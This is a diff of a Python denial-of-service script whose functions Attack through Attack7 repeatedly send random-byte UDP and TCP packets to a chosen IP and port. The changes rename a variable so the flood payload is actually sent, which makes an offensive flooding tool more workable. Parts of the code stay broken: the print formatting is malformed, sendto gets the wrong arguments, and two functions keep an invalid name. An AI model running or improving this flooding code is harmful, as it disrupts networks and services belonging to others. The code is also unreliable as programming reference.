@@ -111,7 +111,7 @@ print(" [ ===============     ] 100%")
 os.system("clear")
 
 def Attack():
-	K-ibytes = random._urandom(3451)
+	K_ibytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -119,14 +119,14 @@ def Attack():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(bytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 		except:
 			sock.close()
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 
 def Attack2():
-	K-ibytes = random._urandom(3451)
+	K_ibytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -134,14 +134,14 @@ def Attack2():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(bytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 		except:
 			sock.close()
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 
 def Attack3():
-	K-ibytes = random._urandom(3451)
+	K_ibytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -149,14 +149,14 @@ def Attack3():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(bytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 		except:
 			sock.close()
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 
 def Attack4():
-	K-ibytes = random._urandom(3451)
+	K_ibytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -164,14 +164,14 @@ def Attack4():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(bytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 		except:
 			sock.close()
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 
 def Attack5():
-	K-ibytes = random._urandom(3451)
+	K_ibytes = random._urandom(3451)
 	data = random._urandom(100000)
 	M = random.choice(("[K]","[K]","[K]"))
 	while True:
@@ -179,7 +179,7 @@ def Attack5():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(bytes,addr,data)
+				sock.sendto(K_ibytes,addr,data)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 		except:
 			sock.close()
@@ -194,7 +194,7 @@ def Attack6():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(bytes,addr,data)
+				sock.sendto(K-ibytes,addr,data)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 		except:
 			sock.close()
@@ -209,7 +209,7 @@ def Attack7():
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #UDP = SOCK_DGRAM
 			addr = (str(ip),int(port))
 			for x in range(times):
-				sock.sendto(bytes,addr,data)
+				sock.sendto(K-ibytes,addr,data)
 			print(K +"Sent Attack To Host And Port % %"(ip(str,port))
 		except:
 			sock.close()
